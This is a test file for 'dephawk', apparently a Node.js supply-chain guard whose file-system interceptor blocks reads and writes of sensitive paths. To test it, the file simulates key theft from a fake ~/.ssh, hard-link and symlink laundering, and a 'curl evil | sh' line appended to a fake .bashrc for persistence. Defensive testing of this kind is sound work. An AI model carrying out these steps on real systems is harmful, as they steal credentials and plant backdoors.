import { describe, it, expect, afterEach, beforeAll, afterAll } from 'vitest';
import fs from 'node:fs';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { mkdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { FsInterceptor } from '../../../src/adapters/interceptors/fs.interceptor.js';
import type { Disposable } from '../../../src/application/ports.js';
import { recordSpy } from './spy.js';

let installed: Disposable | undefined;
afterEach(() => {
  installed?.dispose();
  installed = undefined;
});

const FAKE_SSH = '/home/nobody/.ssh/id_rsa_dephawk_fake';

describe('FsInterceptor', () => {
  it('catches a read of a sensitive path and attributes the capability', () => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.readFileSync(FAKE_SSH)).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('does NOT flag reads of ordinary files', () => {
    const spy = recordSpy();
    installed = new FsInterceptor().install(spy.record);

    // Reading the project's own package.json is mundane -> not intercepted.
    const content = fs.readFileSync(resolve('package.json'), 'utf8');
    expect(content).toContain('"name": "dephawk"');
    expect(spy.calls).toHaveLength(0);
  });

  it('records but allows a sensitive read when policy permits (observe/allow)', () => {
    const spy = recordSpy(); // default: allow
    installed = new FsInterceptor().install(spy.record);

    // Allowed -> original runs; the fake path does not exist, so the ORIGINAL
    // throws ENOENT (not a dephawk block). The call is still recorded.
    expect(() => fs.readFileSync(FAKE_SSH)).toThrow(/ENOENT/);
    // readFileSync may delegate to the (also patched) openSync internally, so
    // the same logical read can surface more than once — at least one records.
    expect(spy.calls.length).toBeGreaterThanOrEqual(1);
    expect(spy.calls.every((c) => c.capability === 'fs.read')).toBe(true);
  });

  it('catches fs.openAsBlob of a sensitive path as fs.read', async () => {
    const spy = recordSpy();
    spy.deny('no blobs');
    installed = new FsInterceptor().install(spy.record);

    const openAsBlob = (fs as unknown as { openAsBlob?: unknown }).openAsBlob;
    if (typeof openAsBlob !== 'function') {
      return; // not on this runtime
    }
    // Denied synchronously before a Blob is ever created.
    expect(() =>
      (fs as unknown as { openAsBlob: (p: string) => unknown }).openAsBlob(FAKE_SSH),
    ).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('catches watching a sensitive path as fs.read (recon over time)', () => {
    const spy = recordSpy();
    spy.deny('no watching');
    installed = new FsInterceptor().install(spy.record);

    // Denied before a real watcher is created, so nothing is left open.
    expect(() => fs.watch(FAKE_SSH, () => {})).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('does NOT flag watching an ordinary path', () => {
    const spy = recordSpy();
    spy.deny();
    installed = new FsInterceptor().install(spy.record);

    const watcher = fs.watch(resolve('package.json'), () => {});
    watcher.close();
    expect(spy.calls).toHaveLength(0);
  });

  it('catches sensitive writes as fs.write', () => {
    const spy = recordSpy();
    spy.deny();
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.writeFileSync('/home/nobody/.npmrc', 'x')).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.capability).toBe('fs.write');
  });

  it('restores the original methods on dispose', () => {
    const before = fs.readFileSync;
    const local = new FsInterceptor().install(recordSpy().record);
    expect(fs.readFileSync).not.toBe(before);
    local.dispose();
    expect(fs.readFileSync).toBe(before);
  });
});

describe('FsInterceptor — destructive members', () => {
  // Erasing a file changes it as surely as rewriting it, and these are what an
  // attacker reaches for to remove traces.
  const cases: [string, () => unknown][] = [
    ['unlinkSync', () => fs.unlinkSync(FAKE_SSH)],
    ['rmSync', () => fs.rmSync(FAKE_SSH)],
    ['truncateSync', () => fs.truncateSync(FAKE_SSH)],
    ['renameSync', () => fs.renameSync(FAKE_SSH, '/tmp/elsewhere')],
  ];

  for (const [name, act] of cases) {
    it(`catches ${name} as fs.write`, () => {
      const spy = recordSpy();
      spy.deny();
      installed = new FsInterceptor().install(spy.record);

      expect(act).toThrow(/dephawk: blocked/);
      expect(spy.last?.capability).toBe('fs.write');
      expect(spy.last?.detail).toContain('.ssh');
    });
  }

  it('checks both paths of a rename, whichever one is sensitive', () => {
    const spy = recordSpy();
    spy.deny();
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.renameSync('/tmp/harmless-dephawk-test', FAKE_SSH)).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('records a copy as a read of the source and a write of the destination', () => {
    const spy = recordSpy(); // allow, so both arguments are reached
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.copyFileSync(FAKE_SSH, '/home/nobody/.npmrc')).toThrow(/ENOENT/);
    expect(spy.calls.map((c) => c.capability)).toEqual(['fs.read', 'fs.write']);
  });
});

describe('FsInterceptor — recon members', () => {
  const FAKE_SSH_DIR = '/home/nobody/.ssh';

  it.each([
    ['readdirSync', () => fs.readdirSync(FAKE_SSH_DIR)],
    ['opendirSync', () => fs.opendirSync(FAKE_SSH_DIR)],
    // The promises surface is patched too. The wrapper refuses *before* calling
    // the original, so it throws synchronously rather than rejecting.
    ['promises.readdir', () => fs.promises.readdir(FAKE_SSH_DIR)],
    // Where the key really lives is content too.
    ['readlinkSync', () => fs.readlinkSync(FAKE_SSH)],
    ['promises.readlink', () => fs.promises.readlink(FAKE_SSH)],
  ])('catches %s of a sensitive path as fs.read', (_name, act) => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    expect(act).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('does NOT flag listing an ordinary directory', () => {
    const spy = recordSpy();
    installed = new FsInterceptor().install(spy.record);

    expect(fs.readdirSync(resolve('src'))).toContain('domain');
    expect(spy.calls).toHaveLength(0);
  });

  // `glob` arrived in Node 22 and dephawk supports 20, where the member is not
  // there to patch at all — `patchMethod` skips what a runtime does not have,
  // which is the same reason dephawk degrades gracefully on Bun and Deno.
  const hasGlob = typeof (fs as { globSync?: unknown }).globSync === 'function';

  it.skipIf(!hasGlob)('catches a glob over a sensitive directory', () => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.globSync(`${FAKE_SSH_DIR}/*`)).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
  });

  it.skipIf(!hasGlob)('checks every pattern in a glob list, not just the first', () => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    // A list whose entries were never resolved would be a free pass.
    expect(() => fs.globSync(['src/*.ts', `${FAKE_SSH_DIR}/*`])).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.detail).toContain('.ssh');
  });
});

describe('FsInterceptor — cp takes a whole tree in one call', () => {
  // `cp(dir, dest, { recursive: true })` is a directory exfil primitive, and it
  // does not route through the patched `copyFile`: before this it copied
  // `~/.ssh` wholesale with the report saying "nothing sensitive touched" — in
  // enforce mode.
  it.each([
    ['cpSync', () => fs.cpSync(FAKE_SSH, '/tmp/dephawk-loot', { recursive: true })],
    [
      'promises.cp',
      () => fs.promises.cp(FAKE_SSH, '/tmp/dephawk-loot', { recursive: true }),
    ],
  ])('catches %s of a sensitive path as fs.read', (_name, act) => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    expect(act).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('records the source as a read and the destination as a write', () => {
    const spy = recordSpy(); // allow, so both arguments are reached
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.cpSync(FAKE_SSH, '/home/nobody/.npmrc')).toThrow(/ENOENT/);
    expect(spy.calls.map((c) => c.capability)).toEqual(['fs.read', 'fs.write']);
  });
});

describe('FsInterceptor — a hard link cannot smuggle a sensitive path out', () => {
  // `link('~/.ssh/id_rsa', 'notes.txt')` then `readFileSync('notes.txt')` reads
  // the key. Unlike a symlink, the read-time realpath resolution cannot catch it
  // — a hard link is a co-equal directory entry, so `realpath('notes.txt')` is
  // `notes.txt`, not the key — so the alias must be caught the moment it is made.
  it.each([
    ['linkSync', () => fs.linkSync(FAKE_SSH, '/tmp/dephawk-hardlink-loot')],
    ['promises.link', () => fs.promises.link(FAKE_SSH, '/tmp/dephawk-hardlink-loot')],
  ])('catches %s of a sensitive source as fs.read', (_name, act) => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    expect(act).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('records the source as a read AND a write, and the destination as a write', () => {
    const spy = recordSpy(); // allow, so every argument is reached
    installed = new FsInterceptor().install(spy.record);

    // A hard link is a full read/write handle to the source's inode, so the
    // source is both — the write is what stops `link(sink, alias)` +
    // `writeFileSync(alias)` from truncating the protected audit log through a
    // name the tamper check never sees. Destination in a nonexistent dir so the
    // real linkSync fails after every path has been judged.
    expect(() => fs.linkSync(FAKE_SSH, '/home/nobody/.npmrc')).toThrow(/ENOENT/);
    expect(spy.calls.map((c) => c.capability)).toEqual([
      'fs.read',
      'fs.write',
      'fs.write',
    ]);
  });
});

describe('FsInterceptor — a symlink cannot be planted at a sensitive path', () => {
  // `symlink('/tmp/attacker-key', '~/.ssh/authorized_keys')` is a write with no
  // read member behind it: planting the link is a backdoor (or a payload dropped
  // into another package). Only the destination is judged — the target is merely
  // pointed at, not read here.
  it.each([
    ['symlinkSync', () => fs.symlinkSync('/tmp/attacker', FAKE_SSH)],
    ['promises.symlink', () => fs.promises.symlink('/tmp/attacker', FAKE_SSH)],
  ])('catches %s at a sensitive destination as fs.write', (_name, act) => {
    const spy = recordSpy();
    spy.deny('not allowed');
    installed = new FsInterceptor().install(spy.record);

    expect(act).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.write');
    expect(spy.last?.detail).toContain('.ssh');
  });

  it('does not treat the symlink target as a read', () => {
    // Pointing a link at a sensitive path does not read it; only the destination
    // is judged, and here the destination is mundane, so nothing fires.
    const spy = recordSpy();
    spy.deny('would throw if the target counted as a read');
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.symlinkSync(FAKE_SSH, '/tmp/dephawk-mundane-link')).not.toThrow(
      /dephawk: blocked/,
    );
    expect(spy.calls).toHaveLength(0);
  });
});

describe('FsInterceptor — writing a shell startup file is persistence', () => {
  const RC = '/home/nobody/.bashrc';

  it.each([
    ['writeFileSync', () => fs.writeFileSync(RC, 'curl evil | sh')],
    ['appendFileSync', () => fs.appendFileSync(RC, '\ncurl evil | sh')],
    ['copyFileSync', () => fs.copyFileSync('/tmp/payload', RC)],
    ['symlinkSync', () => fs.symlinkSync('/tmp/payload', RC)],
  ])('catches %s of a shell rc as fs.write', (_name, act) => {
    const spy = recordSpy();
    spy.deny('no persistence');
    installed = new FsInterceptor().install(spy.record);

    expect(act).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.write');
    expect(spy.last?.detail).toContain('.bashrc');
  });

  it('does NOT flag merely reading a shell rc', () => {
    // Reading a shell rc is unremarkable; only writing one installs persistence.
    const spy = recordSpy();
    spy.deny('would throw if a read were flagged');
    installed = new FsInterceptor().install(spy.record);

    // The file does not exist, so the original throws ENOENT — but dephawk must
    // not have blocked it, and must have recorded nothing.
    expect(() => fs.readFileSync(RC)).toThrow(/ENOENT/);
    expect(spy.calls).toHaveLength(0);
  });
});

describe('FsInterceptor — dephawk’s own protected paths', () => {
  const sink = '/tmp/dephawk-guard-test/events.jsonl';

  it('reports a write to a protected path even though it is not sensitive', () => {
    const spy = recordSpy();
    spy.deny('dephawk audit log');
    installed = new FsInterceptor({ protectedPaths: [sink] }).install(spy.record);

    expect(() => fs.appendFileSync(sink, 'noise')).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.write');
    expect(spy.last?.detail).toBe(sink);
  });

  it('reports an attempt to remove the directory holding it', () => {
    const spy = recordSpy();
    spy.deny('dephawk audit log');
    installed = new FsInterceptor({ protectedPaths: [sink] }).install(spy.record);

    expect(() => fs.rmSync('/tmp/dephawk-guard-test', { recursive: true })).toThrow(
      /dephawk: blocked/,
    );
  });

  it('leaves mundane paths alone when protected paths are configured', () => {
    const spy = recordSpy();
    installed = new FsInterceptor({ protectedPaths: [sink] }).install(spy.record);

    fs.readFileSync(resolve('package.json'), 'utf8');
    expect(spy.calls).toHaveLength(0);
  });

  it('records a hard link of the audit log as a write handle to it', () => {
    // `link(sink, alias)` then `writeFileSync(alias)` truncated the log through a
    // name the tamper check never saw, because `realpath(alias)` is `alias`, not
    // the sink. The source of a hard link is now a write, so the tamper is caught
    // the moment the alias is made.
    const spy = recordSpy(); // allow, so every path is judged
    installed = new FsInterceptor({ protectedPaths: [sink] }).install(spy.record);

    expect(() => fs.linkSync(sink, '/tmp/dephawk-loot-hardlink')).toThrow(/ENOENT/);
    expect(spy.calls.filter((c) => c.detail === sink).map((c) => c.capability)).toEqual([
      'fs.read',
      'fs.write',
    ]);
  });

  it('blocks writing to the audit log through a symlink alias', () => {
    // The realpath fallback must judge the resolved target against the protected
    // paths, not only the sensitivity rules — otherwise a symlink launders a
    // write to the log.
    const base = join(realpathSync(tmpdir()), `dephawk-sink-test-${process.pid}`);
    mkdirSync(base, { recursive: true });
    const realSink = join(base, 'events.jsonl');
    writeFileSync(realSink, '');
    const alias = join(base, 'notes.txt');
    symlinkSync(realSink, alias);

    const spy = recordSpy();
    spy.deny('dephawk audit log');
    installed = new FsInterceptor({ protectedPaths: [realSink] }).install(spy.record);

    try {
      expect(() => fs.writeFileSync(alias, 'CORRUPTED')).toThrow(/dephawk: blocked/);
      expect(spy.last?.capability).toBe('fs.write');
      expect(spy.last?.detail).toBe(realSink); // resolved to the real protected path
    } finally {
      // Dispose before cleanup: rmSync of a directory holding a protected path is
      // itself refused while the interceptor is installed.
      installed?.dispose();
      installed = undefined;
      rmSync(base, { recursive: true, force: true });
    }
  });
});

describe('FsInterceptor — a symlink cannot hide a sensitive path', () => {
  // `path.resolve` does not follow links, so an innocent-looking name pointing
  // at a secret used to be read with no event recorded at all.
  // `tmpdir()` is itself a symlink on macOS (/var/folders -> /private/var/folders),
  // so resolve the base first: the interceptor reports real paths, and the
  // expectations below have to speak the same language.
  const dir = join(realpathSync(tmpdir()), `dephawk-symlink-test-${process.pid}`);
  const secret = join(dir, 'real', '.env');
  const disguise = join(dir, 'notes.txt');
  const secretDir = join(dir, 'home', '.ssh');
  const disguisedDir = join(dir, 'assets');

  beforeAll(() => {
    mkdirSync(join(dir, 'real'), { recursive: true });
    mkdirSync(secretDir, { recursive: true });
    writeFileSync(secret, 'SECRET=1\n');
    symlinkSync(secret, disguise);
    symlinkSync(secretDir, disguisedDir);
  });

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('judges the link by what it points at, not by its own name', () => {
    const spy = recordSpy();
    spy.deny('no secrets');
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.readFileSync(disguise, 'utf8')).toThrow(/dephawk: blocked/);
    expect(spy.last?.capability).toBe('fs.read');
    // The detail is the *real* path, and stays a bare path so the policy engine
    // can still match it against sensitivity rules and allowlists.
    expect(spy.last?.detail).toBe(secret);
  });

  it('catches a new file written inside a linked directory', () => {
    // The leaf does not exist yet, so resolving it fails and the parent has to
    // be resolved instead — `write('assets/authorized_keys')` into `~/.ssh`.
    const spy = recordSpy();
    spy.deny();
    installed = new FsInterceptor().install(spy.record);

    expect(() => fs.writeFileSync(join(disguisedDir, 'authorized_keys'), 'x')).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.capability).toBe('fs.write');
    expect(spy.last?.detail).toBe(join(secretDir, 'authorized_keys'));
  });

  it('still says nothing about an ordinary file that is not a link', () => {
    // The no-noise guarantee: resolving must not turn mundane paths into events.
    const ordinary = join(dir, 'real', 'readme.txt');
    writeFileSync(ordinary, 'hello');
    const spy = recordSpy();
    spy.deny('would throw if this were reported');
    installed = new FsInterceptor().install(spy.record);

    expect(fs.readFileSync(ordinary, 'utf8')).toBe('hello');
    expect(spy.calls).toHaveLength(0);
  });
});
